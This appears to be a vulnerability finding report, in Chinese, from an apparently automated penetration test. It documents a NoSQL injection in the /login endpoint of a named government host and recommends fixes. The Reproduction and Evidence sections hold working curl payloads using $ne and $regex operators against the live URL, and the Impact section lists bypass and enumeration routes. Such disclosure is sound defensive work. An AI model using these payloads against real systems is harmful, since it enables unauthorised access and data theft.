# /login 接口存在 NoSQL 注入（可绕过认证进入 source 校验分支）

- ID: `16af2a47-f55c-4933-8001-6981e33763fa`
- Severity: **high**
- Status: open
- Type: NoSQL 注入
- Target: `POST /login (https://epcr.tpf.gov.tw:4004/login) — username / password 参数`
- Conversation: `532cedc0-0580-4045-a5e2-45c07c488867`
- Created: 2026-09-06 15:43:44.356798518+08:00

## Description

/login 的 username 与 password 字段直接拼入 MongoDB find() 查询，未过滤 NoSQL 操作符。username 注入 $ne 时返回 403「無法登入的來源」（证明查询命中多用户并进入 source 校验分支）；注入 $regex/$exists/$type/$in 时返回 500 "TypeError"（单匹配路径崩溃）。password 同样可注入操作符。

## Reproduction

1. POST /login，Content-Type: application/json
2. body: {"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}
3. 观察响应：HTTP 403，body 为 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}
4. 对比正常字符串 username 的响应（正常登录流程），证明 NoSQL 操作符被后端执行

## Evidence

curl -k -X POST https://epcr.tpf.gov.tw:4004/login -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'
→ HTTP 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}

curl -k -X POST https://epcr.tpf.gov.tw:4004/login -H 'Content-Type: application/json' -d '{"username":{"$regex":"^"},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}'
→ HTTP 500 "TypeError" (11 bytes)

对照组（普通字符串 username）→ 正常登录流程响应。

## Impact

1) 认证绕过路径：username 注入 $ne 可跳过密码校验进入 source 校验（403），若存在 source 允许登录的用户则可完全绕过认证获取 JWT token；2) 信息泄露：通过 403/500 差分可枚举用户存在性与 source 属性；3) 数据泄露：配合 $regex 可逐字符推断用户名；4) 潜在 RCE：若后端对 password 使用 $where 或类似 JS 执行操作符可进一步提权。

## Recommendation

1) 对 username/password 输入做类型校验（强制为 string），拒绝包含 $ 开头的对象；2) 使用 express-mongo-sanitize 或 mongoose 的 strictQuery 过滤 NoSQL 操作符；3) 修复 /login 单匹配路径的 TypeError（空值检查）；4) 将 source 校验逻辑改为白名单并记录日志；5) 统一错误响应，避免 500 泄露内部异常类型。
